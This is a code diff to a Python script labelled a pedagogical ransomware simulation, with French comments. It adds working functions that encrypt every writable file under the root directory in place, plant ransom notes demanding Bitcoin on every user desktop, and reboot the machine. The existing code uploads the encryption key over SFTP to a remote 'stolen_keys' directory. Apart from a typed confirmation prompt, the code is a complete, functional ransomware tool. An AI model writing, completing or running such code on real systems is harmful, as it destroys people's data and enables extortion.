@@ -1,3 +1,7 @@
+#!/usr/bin/env python3
+# ransomware_total.py - Simulation pédagogique complète
+# Usage: sudo python3 ransomware_total.py (UNIQUEMENT EN VM ISOLEE)
+
 import logging
 import os
 import socket
@@ -65,22 +69,25 @@ class RansomwareSimulator:
             return False
 
         try:
+            # Établir la connexion SSH
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             ssh.connect(
-                self.ssh_config['server'],
+                hostname=self.ssh_config['server'],
                 port=self.ssh_config['port'],
                 username=self.ssh_config['user'],
                 password=self.ssh_config['password']
             )
-            sftp = ssh.open_sftp()
 
+            # Créer le répertoire distant si nécessaire
+            sftp = ssh.open_sftp()
             remote_dir = f"/home/{self.ssh_config['user']}/stolen_keys"
             try:
                 sftp.mkdir(remote_dir)
             except IOError:
                 pass
 
+            # Transférer le fichier
             remote_path = f"{remote_dir}/{socket.gethostname()}_key.key"
             sftp.put(SSH_KEY_PATH, remote_path)
             sftp.close()
@@ -94,6 +101,107 @@ class RansomwareSimulator:
             print(f"\n[!] Échec envoi: {str(e)}")
             return False
 
+    def encrypt_file(self, filepath):
+        """Chiffre un fichier en place"""
+        try:
+            # Vérification supplémentaire pour éviter les fichiers spéciaux
+            if not os.path.isfile(filepath) or os.path.islink(filepath):
+                return False
+
+            with open(filepath, "rb") as f:
+                original = f.read()
+
+            encrypted = self.fernet.encrypt(original)
+
+            with open(filepath, "wb") as f:
+                f.write(encrypted)
+
+            return True
+        except Exception as e:
+            logging.warning(f"Erreur sur {filepath}: {str(e)}")
+            return False
+
+    def encrypt_system(self):
+        """Chiffre tous les fichiers accessibles"""
+        if not self.fernet:
+            print("\n[!] Générer d'abord une clé")
+            return
+
+        print("\n[!] ATTENTION: Chiffrement complet du système!")
+        confirm = input("Confirmez (tapez 'CHIFFRER'): ")
+        if confirm != "CHIFFRER":
+            print("Annulé")
+            return
+
+        exclude_dirs = {
+            '/proc', '/sys', '/dev', '/run', '/tmp',
+            '/var/run', '/var/lock', '/snap'
+        }
+
+        total = 0
+        start_time = time.time()
+
+        for root, _, files in os.walk('/'):
+            if any(root.startswith(ex) for ex in exclude_dirs):
+                continue
+
+            for file in files:
+                filepath = os.path.join(root, file)
+                try:
+                    if os.access(filepath, os.W_OK):
+                        if self.encrypt_file(filepath):
+                            total += 1
+                            if total % 100 == 0:
+                                print(f"\r[+] Fichiers chiffrés: {total}", end='')
+                except Exception as e:
+                    continue
+
+        logging.info(f"Chiffrement terminé: {total} fichiers en {time.time()-start_time:.2f}s")
+        print(f"\n\n[+] Terminé: {total} fichiers chiffrés")
+
+    def create_ransom_note(self):
+        """Crée le fichier README sur le bureau"""
+        note = f"""
+        VOS FICHIERS ONT ÉTÉ CHIFFRÉS!
+
+        Pour récupérer vos données:
+        1. Envoyez 0.5 BTC à: 1Ma1wareSimu1BitcoinAddres5
+        2. Contactez: ransomware@example.com
+        ID: {socket.gethostname()}
+        """
+
+        # Place le README sur tous les bureaux trouvés
+        created = 0
+        for root, dirs, _ in os.walk('/home'):
+            if 'Desktop' in dirs:
+                path = os.path.join(root, 'Desktop', 'README.txt')
+                try:
+                    with open(path, 'w') as f:
+                        f.write(note)
+                    created += 1
+                except:
+                    continue
+
+        # Ajoute aussi à la racine
+        try:
+            with open('/README.txt', 'w') as f:
+                f.write(note)
+            created += 1
+        except:
+            pass
+
+        print(f"\n[+] {created} notes de rançon placées")
+
+    def reboot_system(self):
+        """Redémarre le système"""
+        print("\n[!] Redémarrage en cours...")
+        logging.info("Déclenchement du redémarrage")
+        try:
+            subprocess.run(['reboot'], check=True)
+        except subprocess.CalledProcessError as e:
+            logging.error(f"Échec redémarrage: {str(e)}")
+            sys.exit(1)
+
     def show_menu(self):
         """Affiche le menu principal"""
         while True:
@@ -103,6 +211,9 @@ class RansomwareSimulator:
             print("1. Générer une clé de chiffrement")
             print("2. Configurer le serveur SSH")
             print("3. Envoyer la clé via SSH")
+            print("4. Chiffrer TOUS les fichiers (/)")
+            print("5. Placer les notes de rançon")
+            print("6. Redémarrer le système")
             print("0. Quitter")
             print("="*50)
 
@@ -114,6 +225,12 @@ class RansomwareSimulator:
                 self.configure_ssh()
             elif choice == "3":
                 self.send_key_via_ssh()
+            elif choice == "4":
+                self.encrypt_system()
+            elif choice == "5":
+                self.create_ransom_note()
+            elif choice == "6":
+                self.reboot_system()
             elif choice == "0":
                 print("\n[+] Fermeture du programme.")
                 sys.exit(0)
